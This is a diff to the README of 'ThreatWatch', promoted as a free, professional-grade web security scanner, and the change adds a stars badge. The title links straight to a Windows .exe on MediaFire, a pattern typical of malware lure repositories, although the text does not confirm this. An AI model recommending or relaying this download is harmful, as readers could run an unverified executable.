@@ -1,4 +1,8 @@
 # [ThreatWatch](https://www.mediafire.com/file/m2b8sb8gx7h6idu/ThreatWatch.exe/file): Your Comprehensive Free Web Security Solution
+
+![GitHub Repo stars](https://img.shields.io/github/stars/Rocraften/ThreatWatch?style=flat&logo=githubsponsors&logoColor=yellow&label=Stars&color=yellow)
+
+
 ThreatWatch is the next-generation web security scanner designed to empower users with professional-grade tools—completely free of charge. Built on cutting-edge technology, ThreatWatch is tailored for individuals, developers, and organizations striving to protect their online assets.
 
 ## Key Features:
